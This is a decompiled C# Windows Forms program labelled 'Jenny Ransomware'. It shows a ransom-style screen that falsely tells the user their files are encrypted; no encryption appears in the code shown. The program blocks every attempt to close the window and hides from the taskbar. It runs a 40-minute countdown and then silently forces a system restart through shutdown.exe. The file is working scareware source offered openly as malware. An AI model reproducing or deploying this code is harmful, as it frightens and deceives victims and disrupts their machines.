using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;

namespace Jenny_Ransomware_2;

public class Ransomware : Form
{
	private int delay = 2400;

	private IContainer components = null;

	private Timer timer_if;

	private Label label1;

	private GroupBox groupBox1;

	private Label label2;

	private GroupBox groupBox2;

	private Label label3;

	private Timer timer1;

	public Ransomware()
	{
		InitializeComponent();
	}

	private void Ransomware_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void timer_if_Tick(object sender, EventArgs e)
	{
	}

	private void groupBox2_Enter(object sender, EventArgs e)
	{
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (delay >= 0)
		{
			TimeSpan timeSpan = TimeSpan.FromSeconds(--delay);
			((Control)label3).set_Text(timeSpan.ToString("hh\\:mm\\:ss"));
			return;
		}
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "shutdown.exe";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = "shutdown /r /t 0";
		Process.Start(processStartInfo);
		Environment.Exit(-1);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_0170: Unknown result type (might be due to invalid IL or missing references)
		//IL_017a: Expected O, but got Unknown
		//IL_020f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0219: Expected O, but got Unknown
		//IL_029c: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a6: Expected O, but got Unknown
		//IL_0358: Unknown result type (might be due to invalid IL or missing references)
		//IL_0362: Expected O, but got Unknown
		//IL_049c: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a6: Expected O, but got Unknown
		components = new Container();
		timer_if = new Timer(components);
		label1 = new Label();
		groupBox1 = new GroupBox();
		label2 = new Label();
		groupBox2 = new GroupBox();
		label3 = new Label();
		timer1 = new Timer(components);
		((Control)groupBox1).SuspendLayout();
		((Control)groupBox2).SuspendLayout();
		((Control)this).SuspendLayout();
		timer_if.set_Enabled(true);
		timer_if.set_Interval(300);
		timer_if.add_Tick((EventHandler)timer_if_Tick);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Arial Rounded MT Bold", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.Blue);
		((Control)label1).set_Location(new Point(12, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(497, 23));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("All your files are encrypted by Jenny Ransomware");
		((Control)groupBox1).get_Controls().Add((Control)(object)label2);
		((Control)groupBox1).set_Font(new Font("Microsoft Sans Serif", 7.8f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)groupBox1).set_ForeColor(Color.Blue);
		((Control)groupBox1).set_Location(new Point(16, 44));
		((Control)groupBox1).set_Name("groupBox1");
		((Control)groupBox1).set_Size(new Size(424, 146));
		((Control)groupBox1).set_TabIndex(1);
		groupBox1.set_TabStop(false);
		((Control)groupBox1).set_Text("What happened?");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Arial Rounded MT Bold", 7.8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(6, 27));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(414, 48));
		((Control)label2).set_TabIndex(0);
		((Control)label2).set_Text("Your files / system has been locked and encrypted by Jenny\r\nwith a special algorithm. Your photos, videos, images and\r\netc. Now, you became a victim of Jenny Ransomware!");
		((Control)groupBox2).get_Controls().Add((Control)(object)label3);
		((Control)groupBox2).set_Font(new Font("Microsoft Sans Serif", 7.8f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)groupBox2).set_ForeColor(Color.Blue);
		((Control)groupBox2).set_Location(new Point(283, 421));
		((Control)groupBox2).set_Name("groupBox2");
		((Control)groupBox2).set_Size(new Size(424, 146));
		((Control)groupBox2).set_TabIndex(2);
		groupBox2.set_TabStop(false);
		((Control)groupBox2).set_Text("Time left:");
		((Control)groupBox2).add_Enter((EventHandler)groupBox2_Enter);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Arial Rounded MT Bold", 36f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_Location(new Point(76, 46));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(284, 70));
		((Control)label3).set_TabIndex(0);
		((Control)label3).set_Text("00:00:00");
		timer1.set_Enabled(true);
		timer1.set_Interval(1000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(900, 579));
		((Control)this).get_Controls().Add((Control)(object)groupBox2);
		((Control)this).get_Controls().Add((Control)(object)groupBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Ransomware");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("You became a victim of Jenny Ransomware!");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Ransomware_FormClosing));
		((Control)groupBox1).ResumeLayout(false);
		((Control)groupBox1).PerformLayout();
		((Control)groupBox2).ResumeLayout(false);
		((Control)groupBox2).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
